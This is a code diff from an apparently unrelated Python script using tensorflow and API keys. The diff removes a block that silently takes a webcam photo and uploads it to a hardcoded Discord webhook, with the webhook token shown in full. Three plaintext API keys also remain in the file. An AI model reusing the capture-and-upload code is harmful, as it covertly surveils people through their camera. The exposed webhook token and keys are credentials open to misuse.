@@ -9,53 +9,7 @@ import numpy as np
 import tensorflow as tf
 import time  
 import datetime
-import pygame
-import pygame.camera
-from pygame.locals import *
 
-# Initialize Pygame
-pygame.init()
-pygame.camera.init()
-
-# Create a list of available cameras
-cameras = pygame.camera.list_cameras()
-
-if not cameras:
-    print("No cameras found.")
-    quit()
-
-# Use the first camera in the list
-camera = pygame.camera.Camera(cameras[0], (640, 480))
-
-# Start the camera
-camera.start()
-
-# Capture a single frame
-image = camera.get_image()
-
-# Stop the camera
-camera.stop()
-
-# Save the captured image
-pygame.image.save(image, "captured_photo_pygame.jpg")
-
-print("Photo captured and saved as 'captured_photo_pygame.jpg'")
-
-
-
-webhook_url = 'https://discord.com/api/webhooks/1182794753331441694/qParZZ-m6IVlXT_li6wUp4et1bHKpTH54t6diG2Kh6to-wirJ71cC2ls0AjicwS8mttI'
-
-photo_path = "captured_photo_pygame.jpg"
-
-with open(photo_path, "rb") as photo_file:
-    files = {'photo': (photo_path, photo_file, 'image/jpg')}
-
-    response = requests.post(webhook_url, files=files)
-
-if response.status_code == 200:
-    print("Photo sent successfully.")
-else:
-    print(f"Failed to send photo. Status code: {response.status_code}, Response text: {response.text}")
 
 
 api_keys = ['MNI5T6CU7KLSFJA8', 'QJFF49AEUN6NX884', '9ZZWS60Q2CZ6JYUK']
